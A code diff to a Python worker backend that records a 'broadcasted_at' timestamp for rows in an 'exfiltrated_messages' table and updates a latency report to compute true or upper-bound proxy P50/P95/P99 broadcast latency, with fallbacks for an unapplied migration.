@@ -321,9 +321,13 @@ async def _fetch_pending_broadcast_messages(batch_size: int, now_iso: str) -> Li
 
 
 async def _update_message_broadcast_success(msg_id: str) -> None:
+    from datetime import datetime, timezone
+
+    now_iso = datetime.now(timezone.utc).isoformat()
     payload = {
         "is_broadcasted": True,
         "broadcast_claimed_at": None,
+        "broadcasted_at": now_iso,
     }
     if _can_use_broadcast_reliability_columns():
         try:
@@ -339,15 +343,40 @@ async def _update_message_broadcast_success(msg_id: str) -> None:
             _set_broadcast_reliability_columns_available(True)
             return
         except Exception as exc:
-            if not _is_missing_broadcast_reliability_column(exc):
+            if _is_missing_broadcast_reliability_column(exc):
+                _set_broadcast_reliability_columns_available(False)
+                logger.warning(
+                    "[Broadcast] Reliability columns missing on success update; "
+                    "falling back to legacy broadcast status update."
+                )
+            elif "broadcasted_at" in str(exc):
+                # Column not yet migrated — retry without it
+                logger.warning(
+                    "[Broadcast] broadcasted_at column missing; apply migration "
+                    "supabase/migrations/20260803000001_broadcasted_at.sql. "
+                    "Falling back to legacy update."
+                )
+                payload.pop("broadcasted_at", None)
+                await async_execute(
+                    db.table("exfiltrated_messages").update(payload).eq("id", msg_id)
+                )
+                return
+            else:
                 raise
-            _set_broadcast_reliability_columns_available(False)
-            logger.warning(
-                "[Broadcast] Reliability columns missing on success update; "
-                "falling back to legacy broadcast status update."
-            )
 
-    await async_execute(db.table("exfiltrated_messages").update(payload).eq("id", msg_id))
+    # Legacy path — column-existence unknown, try WITH broadcasted_at first
+    try:
+        await async_execute(
+            db.table("exfiltrated_messages").update(payload).eq("id", msg_id)
+        )
+    except Exception as exc:
+        if "broadcasted_at" in str(exc):
+            payload.pop("broadcasted_at", None)
+            await async_execute(
+                db.table("exfiltrated_messages").update(payload).eq("id", msg_id)
+            )
+        else:
+            raise
 
 
 async def _mark_broadcast_failure(msg: Dict[str, Any], exc: BaseException) -> None:
@@ -2156,15 +2185,12 @@ async def _takeover_spike_check_logic() -> dict:
 def exfil_latency_report():
     """Broadcast P50/P95/P99 exfiltration→broadcast latency for the last N messages.
 
-    Sample size is capped at ``EXFIL_LATENCY_SAMPLE_SIZE`` (1000). The
-    ``exfiltrated_messages`` schema does not currently persist an explicit
-    ``broadcasted_at`` timestamp — the closest usable columns are
-    ``created_at`` (message insert time) and ``broadcast_claimed_at`` (reset
-    to NULL on success). We therefore compute an UPPER-BOUND latency proxy:
-    ``NOW - created_at`` for rows where ``is_broadcasted = True``. Actual
-    broadcast occurred somewhere between ``created_at`` and ``NOW``, so the
-    percentiles represent worst-case age. The report body labels this
-    explicitly so consumers don't mistake it for the true latency.
+    Sample size is capped at ``EXFIL_LATENCY_SAMPLE_SIZE`` (1000). If the
+    ``broadcasted_at`` column exists (migration
+    ``20260803000001_broadcasted_at.sql`` applied), we compute TRUE latency
+    as ``broadcasted_at − created_at``. Otherwise we fall back to the
+    upper-bound proxy ``NOW − created_at`` for rows where
+    ``is_broadcasted = True``. The report body labels which mode was used.
     """
     from app.workers.celery_app import get_worker_loop
     return get_worker_loop().run_until_complete(_exfil_latency_report_logic())
@@ -2174,16 +2200,31 @@ async def _exfil_latency_report_logic() -> dict:
     import statistics
     from datetime import datetime, timezone
 
+    # Attempt the true-latency query first (requires broadcasted_at column).
+    true_latency_mode = True
     try:
         response = await async_execute(
             db.table("exfiltrated_messages")
-            .select("id, created_at, is_broadcasted, broadcast_claimed_at")
+            .select("id, created_at, is_broadcasted, broadcasted_at")
             .order("created_at", desc=True)
             .limit(EXFIL_LATENCY_SAMPLE_SIZE)
         )
     except Exception as e:
-        logger.warning(f"[ExfilLatency] db query failed: {e}")
-        return {"status": "db_query_failed", "error": str(e)[:200]}
+        if "broadcasted_at" in str(e):
+            true_latency_mode = False
+            try:
+                response = await async_execute(
+                    db.table("exfiltrated_messages")
+                    .select("id, created_at, is_broadcasted, broadcast_claimed_at")
+                    .order("created_at", desc=True)
+                    .limit(EXFIL_LATENCY_SAMPLE_SIZE)
+                )
+            except Exception as e2:
+                logger.warning(f"[ExfilLatency] db query failed: {e2}")
+                return {"status": "db_query_failed", "error": str(e2)[:200]}
+        else:
+            logger.warning(f"[ExfilLatency] db query failed: {e}")
+            return {"status": "db_query_failed", "error": str(e)[:200]}
 
     rows = response.data or []
     if not rows:
@@ -2194,21 +2235,35 @@ async def _exfil_latency_report_logic() -> dict:
     broadcasted = 0
     pending = 0
 
-    for row in rows:
-        created_raw = row.get("created_at")
-        if not created_raw:
-            continue
+    def _parse_iso(raw) -> datetime | None:
+        if not raw:
+            return None
         try:
-            # Supabase returns ISO-8601; handle trailing 'Z' for py<3.11 safety.
-            created_at = datetime.fromisoformat(str(created_raw).replace("Z", "+00:00"))
+            dt = datetime.fromisoformat(str(raw).replace("Z", "+00:00"))
         except (ValueError, TypeError):
+            return None
+        if dt.tzinfo is None:
+            dt = dt.replace(tzinfo=timezone.utc)
+        return dt
+
+    for row in rows:
+        created_at = _parse_iso(row.get("created_at"))
+        if not created_at:
             continue
-        if created_at.tzinfo is None:
-            created_at = created_at.replace(tzinfo=timezone.utc)
 
         if row.get("is_broadcasted"):
             broadcasted += 1
-            latencies.append((now - created_at).total_seconds())
+            if true_latency_mode:
+                broadcasted_at = _parse_iso(row.get("broadcasted_at"))
+                if broadcasted_at:
+                    # TRUE latency — end-to-end pipeline time
+                    latencies.append((broadcasted_at - created_at).total_seconds())
+                else:
+                    # Legacy row with no broadcasted_at — skip so mean stays honest
+                    continue
+            else:
+                # Proxy — upper bound
+                latencies.append((now - created_at).total_seconds())
         else:
             pending += 1
 
@@ -2238,12 +2293,16 @@ async def _exfil_latency_report_logic() -> dict:
     p99 = _pct(latencies, 99)
     mean = statistics.fmean(latencies)
 
+    mode_label = (
+        "TRUE (broadcasted_at − created_at)"
+        if true_latency_mode
+        else "UPPER-BOUND PROXY (NOW − created_at, schema lacks broadcasted_at)"
+    )
     msg = (
         "📊 **Exfil Latency Report**\n"
         f"Sample: last {len(rows)} messages "
-        f"(broadcasted={broadcasted}, pending={pending})\n"
-        f"Latency proxy = NOW − created_at for is_broadcasted=True rows "
-        "(upper bound — schema lacks broadcasted_at)\n"
+        f"(broadcasted={broadcasted}, pending={pending}, latency_sample={len(latencies)})\n"
+        f"Mode: {mode_label}\n"
         f"• P50: {p50:,.1f}s\n"
         f"• P95: {p95:,.1f}s\n"
         f"• P99: {p99:,.1f}s\n"
